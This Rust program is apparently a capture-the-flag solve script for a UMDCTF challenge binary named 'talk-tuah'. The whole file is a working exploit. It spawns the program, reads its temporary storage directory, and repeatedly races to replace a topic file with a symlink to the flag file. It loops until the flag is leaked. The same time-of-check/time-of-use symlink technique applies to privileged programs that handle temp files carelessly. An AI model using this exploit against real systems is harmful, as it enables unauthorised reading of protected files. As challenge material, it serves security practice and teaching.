use std::{
    fs, io::{BufRead, BufReader, BufWriter, Write}, os::unix::fs as unix_fs, path::PathBuf, process::{Command, Stdio}
};

use anyhow::{Context, Result};

const BINARY: &str = "/app/talk-tuah";
const FLAG: &str = "/app/flag.txt";

#[allow(unused)]
fn print_buffer(b: &[u8]) -> Result<()> {
    println!("[buffer]");
    println!("{}", String::from_utf8(b.to_owned())?);
    println!("[end buffer]");
    Ok(())
}

#[allow(unused_must_use)]
fn try_race() -> Result<Option<String>> {
    let mut child = Command::new(BINARY)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .spawn()
        .context("Failed to spawn child process")?;

    let mut reader = BufReader::new(
        child
            .stdout
            .take()
            .context("Failed to extract stdout from child process")?,
    );
    let mut writer = BufWriter::new(
        child
            .stdin
            .take()
            .context("Failed to extract stdin from child process")?,
    );

    let mut buffer: Vec<u8> = vec![];
    // read until "storage dir: "
    reader.read_until(':' as u8, &mut buffer);
    reader.read_until(' ' as u8, &mut buffer);
    // print_buffer(&buffer);

    // read the storage dir
    buffer.clear();
    reader.read_until('\n' as u8, &mut buffer);
    buffer.retain(|&c| c != '\n' as u8 && c != '"' as u8);
    let temp_path = String::from_utf8(buffer.clone())?;
    // print_buffer(&buffer);

    // read until "TALK TUAHbout: "
    reader.read_until(':' as u8, &mut buffer);
    reader.read_until(' ' as u8, &mut buffer);
    // print_buffer(&buffer);

    // make a topic called "hi"
    writer.write_all(b"hi\n");
    writer.flush();

    // read until "what are your thoughts on hi: "
    buffer.clear();
    reader.read_until(':' as u8, &mut buffer);
    reader.read_until(' ' as u8, &mut buffer);
    // print_buffer(&buffer);

    // write thoughts "test"
    writer.write_all(b"test\n");
    writer.flush();

    // read until "TALK TUAHbout: "
    buffer.clear();
    reader.read_until(':' as u8, &mut buffer);
    reader.read_until(' ' as u8, &mut buffer);
    // print_buffer(&buffer);

    // re-use the same topic
    writer.write_all(b"hi\n");
    writer.flush();

    // now try to do the race; we need to quickly swap /tmp/talk_tuah/{rand}/hi
    // for a symlink to /flag.txt
    let mut p = PathBuf::new();
    p.push(temp_path);
    p.push("hi");
    fs::remove_file(&p);
    unix_fs::symlink(FLAG, &p);

    // read until "TALK TUAHbout: "
    buffer.clear();
    reader.read_until(':' as u8, &mut buffer);
    reader.read_until(' ' as u8, &mut buffer);
    // print_buffer(&buffer);

    // try to quit the program
    // writer.write_all(b"nothing\n");
    // writer.flush();

    child.kill()?;
    // ensure!(
    //     result.success(),
    //     "Child process returned non-zero exit status"
    // );

    let output = String::from_utf8(buffer)?;
    if output.contains("UMDCTF") {
        Ok(Some(output))
    } else if !output.contains("test") {
        // eprintln!("Interesting output: \"{}\"", output);
        Ok(None)
    } else {
        Ok(None)
    }
}

fn main() -> Result<()> {
    let mut i: u64 = 0;
    loop {
        if i % 2000 == 0 {
            eprintln!("Iteration #{}", i);
        }
        i += 1;
        // println!("Trying to run race...");
        let result = try_race();
        match result {
            Ok(Some(flag)) => {
                println!("Found flag in {} iterations: {}", i, flag);
                return Ok(());
            }
            // Ok(None) => println!("Race failed; running again..."),
            // Err(e) => return Err(e),
            _ => {}
        }
    }
}
